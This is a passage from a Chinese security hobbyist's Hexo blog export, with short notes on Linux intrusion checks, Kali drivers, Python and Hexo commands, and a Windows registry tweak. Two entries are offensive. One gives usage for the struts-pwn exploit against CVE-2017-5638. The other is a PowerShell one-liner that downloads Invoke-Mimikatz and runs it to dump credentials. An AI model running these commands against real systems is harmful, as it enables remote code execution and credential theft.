PROMISC 正常网卡不应该存在promisc，如果存在可能有sniffer lsof -i netstat -nap 查看不正常端口 arp -a 查看arp记录是否正常 ifconfig -a 查看网卡设置 检查计划任务 当我们尝试kill恶意程序时，往往会遇到被kill程序自动启动的问题，那么就要检查下计划任务(cron)了。 crontab -u root -l 查看root用户的计划任务 cat /etc/crontab ls -l /etc/cron.* 查看cron文件是否变化的详细信息 ls /var/spool/cron/ 检查系统后门 可以使用工具，如：Conmodo、rkhunter等，当然也可以手工输入命令检查。 vim $HOME/.ssh/authorized_keys 查看ssh永久链接文件 lsmod 检查内核模块 chkconfig –list/systemctl list-units –type=service 检查自启 查看著名的木门后门程序： ls /etc/rc.d #系统开机后，此目录下的文件会被启动 ls /etc/rc3.d find / -name “.rhosts” –print find / -name “.forward” –print 打包文件 当我们做好一切入侵检测分析后，我们需要把一些日志文件copy到本地进行更进一步详细的分析时，怎么打包服务器相关信息，并且copy到本地呢？ 打包web文件打包文件名中包含jsp的文件，打包后的文件为my_txt_files.tar：tar cvf my_txt_files.tar find . -type f -name &quot;*.jsp*&quot; 打包日志文件tar -cvf log.tar /var/log 打包其他信息last &gt; last.log netstat -an &gt; netstat.log]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>入侵检测，安全审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali安装NVIDIA显卡驱动]]></title>
    <url>%2F2018%2F01%2F10%2Fkali%E5%AE%89%E8%A3%85NVIDIA%E6%98%BE%E5%8D%A1%E9%A9%B1%E5%8A%A8%2F</url>
    <content type="text"><![CDATA[安装参考链接https://forums.kali.org/showthread.php?35748-TUTORIAL-Installing-official-NVIDIA-driver-in-Optimus-laptop验证：https://docs.kali.org/general-use/install-nvidia-drivers-on-kali-linux]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>NVIDIA</tag>
        <tag>驱动</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[s2-045 exp CVE-2017-5638]]></title>
    <url>%2F2017%2F03%2F16%2Fs2-045-exp-CVE-2017-5638%2F</url>
    <content type="text"><![CDATA[Usage: Testing a single URL. python struts-pwn.py --url &apos;http://example.com/struts2-showcase/index.action&apos; -c &apos;id&apos; Testing a list of URLs. python struts-pwn.py --list &apos;urls.txt&apos; -c &apos;id&apos; Checking if the vulnerability exists against a single URL. python struts-pwn.py --check --url &apos;http://example.com/struts2-showcase/index.action&apos; Checking if the vulnerability exists against a list of URLs. python struts-pwn.py --check --list &apos;urls.txt&apos; Requirements Python2 or Python3 requests https://github.com/mazen160/struts-pwn/blob/master/struts-pwn.py]]></content>
      <categories>
        <category>exploit</category>
      </categories>
      <tags>
        <tag>s2-045</tag>
        <tag>exp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python command]]></title>
    <url>%2F2017%2F03%2F06%2FPython-command%2F</url>
    <content type="text"><![CDATA[python: py -2 hello.py py -3 hello.py pip py -2 -m pip install XXXX py -3 -m pip install XXXX]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SimpleHTTPServer]]></title>
    <url>%2F2017%2F03%2F05%2FSimpleHTTPServer%2F</url>
    <content type="text"><![CDATA[python -m SimpleHTTPServer 8080 #端口可自定义]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>command</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[win10-Cmd here]]></title>
    <url>%2F2017%2F03%2F04%2Fwin10-Cmd-here%2F</url>
    <content type="text"><![CDATA[保存为reg格式导入注册表即可： Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd_here] @=&quot;Cmd Here&quot; [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd_here\command] @=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot;&quot; [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\cmdPrompt] @=&quot;Cmd Here&quot; [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\cmdPrompt\command] @=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot; \&quot;cd %1\&quot;&quot; [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\cmd_here] @=&quot;Cmd Here&quot; [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\cmd_here\command] @=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot;&quot;]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>cmd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo command]]></title>
    <url>%2F2017%2F03%2F02%2Fhexo-command%2F</url>
    <content type="text"><![CDATA[hexo new &quot;postName&quot; #新建文章 hexo new page &quot;pageName&quot; #新建页面 hexo generate #生成静态页面至public目录 hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server） hexo deploy #将.deploy目录部署到GitHub hexo clean hexo generate --deploy]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mimikittenz-Ps1版]]></title>
    <url>%2F2017%2F03%2F01%2Fmimikittenz-Ps1%E7%89%88%2F</url>
    <content type="text"><![CDATA[powershell “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1‘); Invoke-Mimikatz -DumpCreds”]]></content>
      <categories>
        <category>提权</category>
      </categories>
      <tags>
        <tag>mimikittenz</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0o0-test]]></title>
    <url>%2F2017%2F03%2F01%2F0o0-test%2F</url>
    <content type="text"><![CDATA[测试文章–test—0o0~！！！！！！ hexo new “postName” #新建文章hexo new page “pageName” #新建页面hexo generate #生成静态页面至public目录hexo server #开启预览访问端口（默认端口4000，’ctrl + c’关闭server）hexo deploy #将.deploy目录部署到GitHub hexo new [layout] hexo new photo “My Gallery”hexo new “Hello World” –lang tw title: 使用Hexo搭建个人博客layout: postdate: 2014-03-03 19:07:43comments: truecategories: Blogtags: [Hexo]keywords: Hexo, Blogdescription: 生命在于折腾，又把博客折腾到Hexo了。给Hexo点赞。]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2Fcategories%2Findex.html</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title></title>
    <url>%2Ftags%2Findex.html</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[0o0]]></title>
    <url>%2Fabout%2Findex.html</url>
    <content type="text"><![CDATA[&lt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;&gt;######！######!&lt;&lt;&lt;&gt;&gt;&gt;&lt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&gt;&gt;&lt;&lt;&lt;&gt;&lt;&gt;&gt;&gt;&gt;&gt;]]></content>
  </entry>
</search>
